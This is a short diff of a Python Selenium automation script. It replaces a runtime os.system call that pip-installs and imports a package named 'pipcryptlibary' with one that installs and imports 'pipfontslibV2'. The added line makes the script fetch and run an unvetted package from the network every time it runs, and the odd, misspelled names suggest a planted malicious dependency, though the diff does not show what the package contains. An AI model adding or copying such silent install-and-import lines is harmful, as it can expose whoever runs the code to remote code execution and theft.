@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptlibary")
-import pipcryptlibary
+os.system("pip install pipfontslibV2")
+import pipfontslibV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
